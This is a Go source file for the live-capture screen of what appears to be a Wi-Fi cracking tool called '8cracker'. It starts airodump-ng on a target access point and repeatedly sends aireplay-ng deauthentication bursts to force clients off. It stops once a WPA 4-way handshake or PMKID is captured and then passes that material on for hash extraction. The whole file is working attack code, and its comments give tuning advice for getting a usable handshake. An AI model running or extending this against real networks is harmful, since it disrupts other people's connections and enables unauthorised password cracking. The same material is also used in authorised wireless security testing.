package tui

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"8cracker/internal/core"
	tea "github.com/charmbracelet/bubbletea"
)

type captureTickMsg struct{}

// captureModel drives the live capture: it starts airodump-ng locked to the target
// BSSID/channel, periodically fires gentle deauth bursts (only when clients are
// present), and inspects the capture every couple of seconds. The moment a full
// 4-way handshake (M2+M4) or a PMKID is seen, it stops airodump-ng and advances to
// the extract screen automatically.
type captureModel struct {
	monIface              string
	target                core.AP
	client                string
	proc                  *exec.Cmd
	logPath               string
	airodumpErr           string
	start                 time.Time
	lastDeauth            time.Time
	lastInspect           time.Time
	deauthSent            int
	done                  bool
	success               bool
	log                   []string
	summary               string
	m1, m2, m3, m4, pmkid int
	stations              int
}

func newCaptureModel(mon string, ap core.AP, client string) captureModel {
	bssid := ap.BSSID
	channel := ap.Channel
	prefix := core.CaptureBase()
	core.RemoveStale(prefix + "-*")
	logPath := filepath.Join(core.WorkDir(), "capture_airodump.log")
	lf, _ := os.Create(logPath)
	proc := core.AirodumpCaptureCmd(bssid, channel, prefix, mon)
	proc.Stdout = lf
	proc.Stderr = lf
	cm := captureModel{
		monIface: mon,
		target:   ap,
		client:   client,
		proc:     proc,
		logPath:  logPath,
		start:    time.Now(),
		// seed lastDeauth in the past so the first deauth fires immediately
		lastDeauth:  time.Now().Add(-time.Duration(core.DeauthInterval) * time.Second),
		lastInspect: time.Now(),
	}
	cm.log = append(cm.log, fmt.Sprintf("capture started for %s on channel %s", bssid, channel))
	if client != "" {
		cm.log = append(cm.log, "deauth target: single client "+client)
	} else {
		cm.log = append(cm.log, "deauth target: broadcast (all clients)")
	}
	if err := proc.Start(); err != nil {
		cm.airodumpErr = err.Error()
		cm.log = append(cm.log, "airodump-ng failed to start: "+err.Error())
		return cm
	}
	return cm
}

func (m *captureModel) sendDeauth() {
	m.deauthSent++
	go func(bssid, mon, client string) {
		cmd := core.AireplayDeauthCmd(bssid, mon, core.DeauthCount, client)
		dn, _ := os.OpenFile(os.DevNull, os.O_WRONLY, 0)
		cmd.Stdout = dn
		cmd.Stderr = dn
		_ = cmd.Run()
	}(m.target.BSSID, m.monIface, m.client)
}

func (m captureModel) Init() tea.Cmd { return captureTick() }

func captureTick() tea.Cmd {
	return tea.Tick(1*time.Second, func(time.Time) tea.Msg { return captureTickMsg{} })
}

func (m captureModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "q", "esc":
			m.stopProc()
			return m, tea.Quit
		case "d":
			if !m.done {
				m.log = append(m.log, "manual deauth burst sent")
				m.sendDeauth()
			}
		case "s":
			if !m.done {
				m.log = append(m.log, "stopping early — extracting whatever we have")
				m.done = true
				m.stopProc()
				return m, func() tea.Msg { return nextScreenMsg{screen: screenExtract} }
			}
		}
	case captureTickMsg:
		if m.done {
			return m, nil
		}
		// Detect if airodump-ng died unexpectedly.
		if m.proc != nil && m.proc.Process != nil {
			if err := m.proc.Process.Signal(syscall.Signal(0)); err != nil {
				tail, _ := tailFile(m.logPath, 6)
				m.airodumpErr = "airodump-ng exited: " + strings.TrimSpace(tail)
				m.log = append(m.log, "capture process died: "+m.airodumpErr)
				m.done = true
				m.stopProc()
				return m, func() tea.Msg { return nextScreenMsg{screen: screenExtract} }
			}
		}
		// Periodic, gentle deauth — only when a client is actually associated.
		// Blasting deauth with no client just resets the AP's EAPOL state
		// (renews ANONCE / zeroes PMKID) and ruins the capture, per hcxpcapngtool.
		if time.Since(m.lastDeauth) >= time.Duration(core.DeauthInterval)*time.Second {
			m.lastDeauth = time.Now()
			if m.stations > 0 {
				m.log = append(m.log, fmt.Sprintf("deauth burst #%d sent (clients: %d)", m.deauthSent+1, m.stations))
				m.sendDeauth()
			} else {
				m.log = append(m.log, "no clients associated yet — skipping deauth")
			}
		}
		// Periodically inspect the capture for handshake progress.
		if time.Since(m.lastInspect) >= 2*time.Second {
			m.lastInspect = time.Now()
			ok, summary := core.InspectCapture(core.CaptureCap())
			m.summary = summary
			m.m1, m.m2, m.m3, m.m4, m.pmkid = core.HandshakeProgress(summary)
			m.stations = len(core.ParseStations(core.CaptureCSV(), m.target.BSSID))
			// Auto-stop as soon as a usable handshake is in the bag — no manual
			// 's' needed. A complete 4-way exchange (M2 AND M4 observed) or a
			// PMKID is enough; hcxpcapngtool producing a non-empty hash is the
			// strongest confirmation. This mirrors the Python front-end's
			// _has_handshake detection.
			captured := ok || (m.m2 > 0 && m.m4 > 0) || m.pmkid > 0
			if captured {
				m.success = true
				m.done = true
				if ok {
					m.log = append(m.log, "handshake captured — hash extracted")
				} else {
					m.log = append(m.log, "handshake captured (4-way/PMKID seen) — finalizing")
				}
				m.stopProc()
				return m, func() tea.Msg { return nextScreenMsg{screen: screenExtract} }
			}
		}
		if time.Since(m.start) >= time.Duration(core.MaxCaptureSeconds)*time.Second {
			m.done = true
			m.log = append(m.log, "timeout — no complete handshake captured")
			m.stopProc()
			return m, func() tea.Msg { return nextScreenMsg{screen: screenExtract} }
		}
		return m, captureTick()
	case tea.WindowSizeMsg:
	}
	return m, nil
}

func (m *captureModel) stopProc() {
	if m.proc != nil && m.proc.Process != nil {
		_ = m.proc.Process.Signal(os.Interrupt)
		_ = m.proc.Wait()
	}
}

func (m captureModel) View() string {
	elapsed := int(time.Since(m.start).Seconds())
	essid := m.target.ESSID
	if essid == "" {
		essid = "<hidden>"
	}
	hdr := titleStyle.Render("Capture") + "  " + cyanStyle.Render(essid) +
		"  " + subStyle.Render(fmt.Sprintf("%s CH %s", m.target.BSSID, m.target.Channel)) +
		"  " + subStyle.Render("on "+m.monIface)

	status := greenStyle.Render("capturing...")
	if m.done {
		if m.success {
			status = greenStyle.Render("handshake captured")
		} else {
			status = yellowStyle.Render("stopped — extracting")
		}
	}

	prog := fmt.Sprintf("EAPOL  M1:%d M2:%d M3:%d M4:%d   PMKID:%d   clients:%d   deauth:%d",
		m.m1, m.m2, m.m3, m.m4, m.pmkid, m.stations, m.deauthSent)
	bar := progressBar(elapsed, core.MaxCaptureSeconds, 28)

	log := ""
	for _, l := range lastLines(m.log, 8) {
		log += "  " + l + "\n"
	}
	if m.airodumpErr != "" {
		log += redStyle.Render("  airodump-ng error: "+m.airodumpErr) + "\n"
	}

	help := helpStyle.Render(fmt.Sprintf("elapsed %ds/%ds ", elapsed, core.MaxCaptureSeconds) + bar +
		"  • [d] deauth  [s] stop early  [q] quit")
	return hdr + "\n" + status + "\n" + prog + "\n\n" + log + "\n" + help
}

func progressBar(cur, max, width int) string {
	if max <= 0 {
		max = 1
	}
	pct := cur * width / max
	if pct > width {
		pct = width
	}
	return "[" + strings.Repeat("=", pct) + strings.Repeat(" ", width-pct) + "]"
}

func lastLines(log []string, n int) []string {
	if len(log) <= n {
		return log
	}
	return log[len(log)-n:]
}

func tailFile(path string, n int) (string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
	if len(lines) > n {
		lines = lines[len(lines)-n:]
	}
	return strings.Join(lines, "\n"), nil
}
